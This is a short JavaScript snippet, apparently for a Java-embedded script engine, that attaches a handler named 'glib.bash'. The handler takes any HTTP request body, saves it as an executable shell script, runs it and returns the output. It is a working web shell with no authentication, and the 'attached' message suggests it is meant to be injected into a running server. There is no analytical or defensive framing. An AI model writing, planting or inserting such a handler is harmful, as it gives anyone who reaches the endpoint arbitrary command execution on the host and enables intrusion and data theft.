try{
	glib.bash=function(req,res,os){
		try{
			var is=req.getInputStream();
			temp = java.io.File.createTempFile("tmpscriptnh", ".sh");
			java.nio.file.Files.setPosixFilePermissions(temp.toPath(),java.nio.file.attribute.PosixFilePermissions.fromString("rwxr-x---"));
			try{
				var fos=new java.io.FileOutputStream(temp);
				IOUtils.copy(is,fos);
				fos.close();
				var processBuilder=new java.lang.ProcessBuilder();
				processBuilder.redirectErrorStream(true);
				processBuilder.command(temp.getAbsolutePath());
				try{
					process=processBuilder.start();
					reader=new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
					var line;
					while ((line = reader.readLine()) != null) {
						IOUtils.write(line,os);
						IOUtils.write('\n',os);
					}
					var exitCode=process.waitFor();
					IOUtils.closeQuietly(os);
				}catch(e){
					IOUtils.write(e,os);
					IOUtils.closeQuietly(os);
				}
				temp.delete();
			}catch(e){
				IOUtils.write(e,os);
				IOUtils.closeQuietly(os);
			}
		}catch(e){
			IOUtils.write(e,os);
			IOUtils.closeQuietly(os);
		}
	}
	'glib.bash attached\n';
}catch(e){
	e;
}
